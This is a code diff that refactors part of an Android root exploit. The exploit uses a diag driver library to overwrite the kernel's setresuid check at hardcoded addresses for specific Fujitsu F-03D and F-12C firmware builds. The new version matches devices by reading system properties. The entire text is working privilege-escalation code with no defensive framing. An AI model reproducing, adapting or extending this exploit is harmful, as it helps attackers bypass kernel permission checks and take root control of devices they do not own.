@@ -23,33 +23,41 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <sys/system_properties.h>
 
-#include "diag.h"
-#include "device.h"
+#include "libdiagexploit/diag.h"
 
-typedef struct {
-  DeviceId device;
-  unsigned long int address;
-} sys_setresuid_check_addresses;
+typedef struct _supported_device {
+  const char *device;
+  const char *build_id;
+  unsigned long int set_sysresuid_check_address;
+} supported_device;
 
-static sys_setresuid_check_addresses sys_setresuid_check_address_list[] = {
-  { F03D_V24, 0xc00e83ce },
-  { F12C_V21, 0xc00e5ad2 }
+static supported_device supported_devices[] = {
+  { "F-03D",  "V24R33Cc", 0xc00e83ce },
+  { "F-12C",  "V21"     , 0xc00e5ad2 }
 };
 
-static int n_sys_set_resuid_check_address_list =
-  sizeof(sys_setresuid_check_address_list) / sizeof(sys_setresuid_check_address_list[0]);
+static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
 
 static unsigned long int
-get_sys_setresuid_check_addresses(DeviceId device)
+get_sys_setresuid_check_addresses(void)
 {
   int i;
+  char device[PROP_VALUE_MAX];
+  char build_id[PROP_VALUE_MAX];
 
-  for (i = 0; i < n_sys_set_resuid_check_address_list; i++) {
-    if (sys_setresuid_check_address_list[i].device == device) {
-      return sys_setresuid_check_address_list[i].address;
+  __system_property_get("ro.product.model", device);
+  __system_property_get("ro.build.display.id", build_id);
+
+  for (i = 0; i < n_supported_devices; i++) {
+    if (!strcmp(device, supported_devices[i].device) &&
+        !strcmp(build_id, supported_devices[i].build_id)) {
+      return supported_devices[i].set_sysresuid_check_address;
     }
   }
+
+  printf("%s (%s) is not supported.\n", device, build_id);
 
   return 0;
 }
@@ -58,7 +66,7 @@ static bool
 inject_command(const char *command,
                unsigned long int sys_setresuid_check_address)
 {
-  struct values injection_data;
+  struct diag_values injection_data;
 
   injection_data.address = sys_setresuid_check_address;
   injection_data.value = command[0] | (command[1] << 8);
@@ -85,14 +93,8 @@ main(int argc, char **argv)
 {
   int ret;
   unsigned long int sys_setresuid_check_address;
-  DeviceId device;
 
-  device = detect_device();
-  if (device == UNSUPPORTED) {
-    exit(EXIT_FAILURE);
-  }
-
-  sys_setresuid_check_address = get_sys_setresuid_check_addresses(device);
+  sys_setresuid_check_address = get_sys_setresuid_check_addresses();
   if (!sys_setresuid_check_address) {
     exit(EXIT_FAILURE);
   }
